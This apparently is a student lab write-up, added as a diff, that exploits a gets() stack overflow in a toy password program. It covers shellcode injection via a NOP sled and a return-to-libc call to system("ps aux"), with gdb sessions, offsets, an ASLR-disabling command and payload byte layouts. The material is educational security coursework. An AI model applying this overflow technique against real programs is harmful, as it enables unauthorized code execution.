@@ -1,0 +1,185 @@
+Part 1: Code Inject
+
+Objective:
+Construct an exploit input that can inject a shellcode to be executed in the vulnerable program.
+The shell code is appended in the end of this template. This shell code will run “ps” program to print the running processes.
+To complete this exploit, the start address of the shell code should be used to overflow the return address.
+Since the shell code will be injected on the stack, figuring out the address of “Password” on the stack is the key to solve this problem.
+
+before start need to disable ASLR
+    echo 0 > /proc/sys/kernel/randomize_va_space
+
+Steps:
+
+set a break point at IsPasswordOkay then run until break and print Password address and examine registers
+
+(gdb) break IsPasswordOkay
+    Breakpoint 1 at 0x8048471: file example01.c, line 7.
+
+(gdb) run
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
+    Enter password:
+
+    Breakpoint 1, IsPasswordOkay () at example01.c:7
+    7	  gets(Password);
+
+(gdb) print &Password
+    &Password = (char (*)[12]) 0xffffd094
+
+(gdb) info registers
+    ...
+    esp            0xffffd090
+    ebp            0xffffd0a8
+    ...
+    eip            0x8048471 <IsPasswordOkay+6>
+    ...
+
+the address of the array &Password is at ebp-0x14
+
+trying to run with the original codeinjection.bin shell code fails
+
+(gdb) run < codeinjection.bin
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < codeinjection.bin
+    Enter password:
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x31313131 in ?? ()
+
+this causes a segfault but also reveals what parts of the shellcode end up where.
+
+(gdb) info registers
+    ...
+    esp            0xffffd070	0xffffd0b0
+    ebp            0x31313131	0x31313131
+    ...
+    eip            0x31313131	0x31313131
+    ...
+
+in the original codeinjection.bin shell code, the 2 groups of "31 31 31 31" affects the ebp and eip registers.
+first 4 bytes changes ebp
+last 4 bytes changes eip
+
+have to write the addresses backwards so 0xffffd094 becomes 94 d0 ff ff
+
+it seems like the beginning bytes before the sequence of 8 bytes of "31" might not do stuff
+the group of "90" bytes after the "31"s forms the NOP sled since the hex 90 is a no-operation code
+the actual part to launch the shell and execute ps is at the bottom of the NOP sled.
+
+Password array is size 12, the part to change ebp will start at Password[20], and the part to change eip will start at Password[24]
+The NOP sled then begins at Password[28], once execution gets there it will cycle over the NOPs and eventually execute the PS command
+&Password     = 0xffffd094
+&Password[20] = 0xffffd0a8
+&Password[24] = 0xffffd0ac
+&Password[28] = 0xffffd0b0
+
+the goal is to locate the start of the NOP sled and change the eip to go there
+so the last 4 bytes in the group of "31"s is changed to B0 D0 FF FF
+
+now when executing the modified shell code successful
+
+(gdb) run < inject.bin
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < inject.bin
+    Enter password:
+    process 5411 is executing new program: /bin/ps
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    PID TTY          TIME CMD
+    3799 pts/1    00:00:00 bash
+    5407 pts/1    00:00:00 gdb
+    5411 pts/1    00:00:00 ps
+    [Inferior 1 (process 5411) exited normally]
+
+----------------------------------------
+
+Part 2: Return to libc
+
+Objective:
+Construct an exploit input that takes advantage of the existing “system” library call in libc to achieve the same goal as in the first task.
+That is, we want to run “ps” command, without injecting any code into the stack of the vulnerable program.
+Instead of jumping to the shell code from the exploit input, we want to redirect the program to jump into the “system” function call.
+We need to locate the entrypoint of the “system” function call and prepare the stack properly to supply the parameter “ps” to the system function call.
+
+Steps:
+
+(gdb) display &system
+    &system = (<text variable, no debug info> *) 0xf7e3a940 <system>
+
+trying to run with the original returntolibc.bin shell code fails
+
+(gdb) run < return.bin
+    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < return.bin
+    Enter password:
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x61616161 in ?? ()
+
+this causes a segfault but also reveals what parts of the shellcode end up where.
+
+(gdb) info registers
+    ...
+    esp            0xffffd070	0xffffd0b0
+    ebp            0x61616161	0x61616161
+    ...
+    eip            0x61616161	0x61616161
+    ...
+
+in the original returntolibc.bin shell code, there are 8 groups of "61 61 61 61" before the part for PS.
+
+using the original shell code, it looks like some of the groups affect ebp and eip like in part 1
+
+the 6th group of bytes changes ebp
+the 7th group of bytes changes eip
+
+&system       = 0xf7e3a940
+&Password     = 0xffffd094
+&Password[28] = 0xffffd0b0 "&system"
+&Password[40] = 0xffffd09c "ps aux"
+
+address of system goes at position 7 in the shell code
+
+structure of shell code: offset + &system + dummy return address + &command
+
+aaaaaaaaaaaaaaaaaaaaaaaa + 40 a9 e3 f7 + aaaa +  9c d0 ff ff + aaaa + ps aux
+
+running modified shell code successfully:
+
+Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < return.bin
+Enter password:
+[New process 14486]
+process 14486 is executing new program: /bin/dash
+[New process 14487]
+process 14487 is executing new program: /bin/ps
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0 185472  6028 ?        Ss   Jan16   0:01 /sbin/init splash
+root         2  0.0  0.0      0     0 ?        S    Jan16   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   Jan16   0:00 [kworker/0:0H]
+...
+root     14413  0.0  0.0      0     0 ?        I    13:48   0:00 [kworker/u8:0]
+duluoz   14460  1.2  0.3 605632 28124 ?        Rl   13:50   0:00 mate-terminal
+duluoz   14467  0.0  0.0  14872  1740 ?        S    13:50   0:00 gnome-pty-helper
+duluoz   14468  0.1  0.0  22672  5148 pts/1    Ss   13:50   0:00 bash
+duluoz   14480  6.8  0.5 106924 44756 pts/1    S    13:50   0:00 gdb ./example01
+duluoz   14482  0.0  0.0   2192   568 pts/1    S+   13:50   0:00 /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
+duluoz   14486  0.0  0.0   4504   920 pts/1    S+   13:50   0:00 sh -c ps aux
+duluoz   14487  0.0  0.0  37364  3284 pts/1    R+   13:50   0:00 ps aux
+[Inferior 3 (process 14487) exited normally]
+
+
+--------------------------------
+
+https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it
+
+the Note:
+
+the modified shell code has to take into account that the difference of the location on the stack is affected by the environment variables.
+The exploit running in gdb will have a slightly different offset than when running out of the debugger.
+The location in gdb of 0xFFFFD0B0 will be  0xFFFFD110 the shell code runs outside of the debugger because of the modified location now
+
+
+look at where crashing
+
+dmesg | tail -20
+
+
